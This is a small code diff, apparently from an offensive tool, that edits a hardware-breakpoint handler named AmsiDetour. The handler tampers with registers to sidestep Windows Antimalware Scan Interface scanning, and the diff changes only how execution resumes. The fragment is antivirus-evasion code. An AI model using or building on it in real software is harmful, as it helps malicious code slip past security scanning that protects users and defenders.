@@ -455,7 +455,7 @@ auto DECLFN HwbpEng::AmsiDetour(
     _In_ PCONTEXT Ctx
 ) -> VOID {
     Ctx->Rdx  = (UPTR)Self->Krnl32.GetModuleHandleA;
-    Ctx->Rip += 5;
+    CONTINUE_EXEC( Ctx );
 }
 
 auto DECLFN HwbpEng::AmsiThunk(
